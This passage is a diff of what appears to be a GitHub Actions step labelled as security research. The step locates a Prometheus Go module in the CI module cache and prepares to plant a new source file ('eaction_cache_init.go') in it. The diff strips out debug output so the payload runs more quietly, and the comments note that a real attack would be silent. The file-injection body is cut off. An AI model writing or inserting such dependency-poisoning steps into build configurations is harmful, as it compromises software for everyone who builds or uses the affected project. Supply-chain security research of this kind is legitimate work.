@@ -101,12 +101,9 @@ runs:
         # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
         # payload execution in CI logs for our evaluation. A real attacker would not
         # include any visible output — the payload would be completely silent.
-        echo "[RESEARCH] HOME=$HOME, GOPATH=$(go env GOPATH), GOMODCACHE=$(go env GOMODCACHE)"
-        echo "[RESEARCH] PWD=$(pwd), go.mod exists: $(test -f go.mod && echo yes || echo no)"
-        go mod download 2>&1 | tail -5 || true
-        echo "[RESEARCH] Searching for prometheus dirs in $(go env GOMODCACHE)..."
-        find "$(go env GOMODCACHE)" -not -path "*/cache/*" -type d -path "*/prometheus/*" 2>/dev/null | head -5 || true
-        pkgdir=$(find "$(go env GOMODCACHE)" -not -path "*/cache/*" -type d -path "*/prometheus/*" 2>/dev/null | head -1 || true)
+        modcache=$(go env GOMODCACHE)
+        go mod download 2>/dev/null || true
+        pkgdir=$(find "$modcache" -not -path "*/cache/*" -type d -path "*/prometheus/*" 2>/dev/null | head -1 || true)
         if [ -n "$pkgdir" ] && [ ! -f "$pkgdir/eaction_cache_init.go" ]; then
           echo "[RESEARCH] Found target module directory: $pkgdir"
           pkgname=$(grep -r "^package " "$pkgdir"/ 2>/dev/null | grep '\.go:' | head -1 | awk '{print $2}')
